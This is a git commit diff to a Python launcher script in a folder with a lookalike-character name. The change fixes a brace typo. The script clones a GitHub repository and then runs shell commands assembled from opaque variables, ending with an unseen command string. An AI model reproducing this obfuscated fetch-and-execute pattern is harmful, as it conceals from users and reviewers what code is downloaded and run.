e60b344deaf55758fcd0abcab9ea3a5c93086ceb
hypevoidsouls <hypevoidsoul@yahoo.com>
2021-07-07 09:16:42 +0530

    nre

--- ᎥᏁᏦᎥᏦᏒᎩᎩ/__main__.py
+++ ᎥᏁᏦᎥᏦᏒᎩᎩ/__main__.py
@@ -2,5 +2,5 @@ from HEIST import *
 os.system("git clone https://github.com/hypevoidsouls/{}.git".format(IK))
 from knite import *
 os.system("{} {} {}/{}/{}.{}".format(GT,CL,DT,BA,KA,HU))
-os.system("{} {} {}}/{}/{}.{}".format(GT,CL,DT,BA,TA,HU))
+os.system("{} {} {}/{}/{}.{}".format(GT,CL,DT,BA,TA,HU))
 os.system(RYD)
